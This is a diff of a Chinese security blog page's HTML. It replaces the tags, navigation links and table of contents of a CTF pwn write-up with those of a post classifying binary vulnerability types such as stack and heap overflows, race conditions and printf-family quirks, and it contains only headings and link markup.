         <div class="post-tags">
           
-            <a href="/tags/堆的利用（chunk-overlapping）/" rel="tag"><i class="fa fa-tag"></i> 堆的利用（chunk_overlapping）</a>
+            <a href="/tags/pwn基础/" rel="tag"><i class="fa fa-tag"></i> pwn基础</a>
+          
+            <a href="/tags/小心得/" rel="tag"><i class="fa fa-tag"></i> 小心得</a>
           
         </div>
       
@@ -570,8 +542,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/31/hitcontraning-lab13-writeup/" rel="next" title="hitcontraning_lab13_writeup">
-                <i class="fa fa-chevron-left"></i> hitcontraning_lab13_writeup
+              <a href="/2019/08/16/2019中关村信息安全专项赛/" rel="next" title="2019中关村信息安全专项赛">
+                <i class="fa fa-chevron-left"></i> 2019中关村信息安全专项赛
               </a>
             
           </div>
@@ -579,10 +551,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/01/2014-hacklu-oreo/" rel="prev" title="2014-hacklu-oreo-writeup">
-                2014-hacklu-oreo-writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -769,7 +737,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#预览："><span class="nav-number">1.</span> <span class="nav-text">预览：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞如何利用："><span class="nav-number">2.</span> <span class="nav-text">漏洞如何利用：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp如下："><span class="nav-number">3.</span> <span class="nav-text">exp如下：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我第一次做的时候的一些心得："><span class="nav-number">4.</span> <span class="nav-text">我第一次做的时候的一些心得：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2015-hacklu-bookstore"><span class="nav-number">4.1.</span> <span class="nav-text">2015_hacklu_bookstore:</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#我个人对题目的等级划分："><span class="nav-number">2.</span> <span class="nav-text">我个人对题目的等级划分：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞："><span class="nav-number">3.</span> <span class="nav-text">漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#溢出类漏洞："><span class="nav-number">3.1.</span> <span class="nav-text">溢出类漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#栈溢出："><span class="nav-number">3.1.1.</span> <span class="nav-text">栈溢出：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆溢出："><span class="nav-number">3.1.2.</span> <span class="nav-text">堆溢出：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#整数溢出-字符溢出："><span class="nav-number">3.1.3.</span> <span class="nav-text">整数溢出/字符溢出：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数组下标缺失检查"><span class="nav-number">3.1.4.</span> <span class="nav-text">数组下标缺失检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#空间复用："><span class="nav-number">3.1.5.</span> <span class="nav-text">空间复用：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">3.1.6.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逻辑类漏洞："><span class="nav-number">3.2.</span> <span class="nav-text">逻辑类漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#条件竞争："><span class="nav-number">3.2.1.</span> <span class="nav-text">条件竞争：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运算符优先级："><span class="nav-number">3.2.2.</span> <span class="nav-text">运算符优先级：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#状态检查："><span class="nav-number">3.2.3.</span> <span class="nav-text">状态检查：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极端情况漏洞："><span class="nav-number">3.3.</span> <span class="nav-text">极端情况漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#极大："><span class="nav-number">3.3.1.</span> <span class="nav-text">极大：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极小："><span class="nav-number">3.3.2.</span> <span class="nav-text">极小：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#库函数自身漏洞："><span class="nav-number">3.4.</span> <span class="nav-text">库函数自身漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#printf"><span class="nav-number">3.4.1.</span> <span class="nav-text">printf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#printf-chk"><span class="nav-number">3.4.2.</span> <span class="nav-text">__printf_chk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#scanf"><span class="nav-number">3.4.3.</span> <span class="nav-text">scanf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#abs"><span class="nav-number">3.4.4.</span> <span class="nav-text">abs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#snprintf"><span class="nav-number">3.4.5.</span> <span class="nav-text">snprintf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strchr"><span class="nav-number">3.4.6.</span> <span class="nav-text">strchr</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他（算是特点，不算是漏洞了其实）："><span class="nav-number">3.5.</span> <span class="nav-text">其他（算是特点，不算是漏洞了其实）：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#类编辑操作次数不限："><span class="nav-number">3.5.1.</span> <span class="nav-text">类编辑操作次数不限：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无干扰字符："><span class="nav-number">3.5.2.</span> <span class="nav-text">无干扰字符：</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
